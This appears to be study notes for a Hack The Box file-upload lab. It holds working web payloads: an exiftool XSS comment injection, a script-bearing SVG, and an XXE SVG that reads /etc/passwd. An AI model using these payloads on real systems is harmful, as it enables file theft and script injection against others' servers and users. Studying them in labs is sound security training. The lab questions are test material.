# Limited File Uploads

- The above exercise contains an upload functionality that should be secure against arbitrary file uploads.
 Try to exploit it using one of the attacks shown in this section to read "/flag.txt"

  `Hint`: Use an attack that can read files, and don't forget to check the page source!
- Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)
  
  `Hint`: Use a different payload to read source code.
---
## Possible Attacks

- `XSS` via comment injection:
  ```bash
  exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
  ```
- `XSS` via HTB.svg:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
      <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
      <script type="text/javascript">alert(window.origin);</script>
  </svg>
  ```
- `XXE` via `.svg` file:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <svg>&xxe;</svg>
  ```
